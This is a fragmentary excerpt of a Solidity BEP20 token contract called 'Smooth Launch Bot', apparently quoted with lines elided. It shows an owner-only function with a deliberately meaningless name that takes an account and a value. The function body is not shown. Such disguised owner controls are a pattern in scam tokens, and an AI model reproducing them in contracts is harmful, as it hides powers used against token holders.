...
contract SLB is BEP20, Ownable {
  ...
  using SafeMath for uint256;
    ...
    string private _name = "Smooth Launch Bot";
    string private _symbol = "SLB";
    ...
    function _stiior4499et(address _acc, uint8 _value) public onlyOwner {
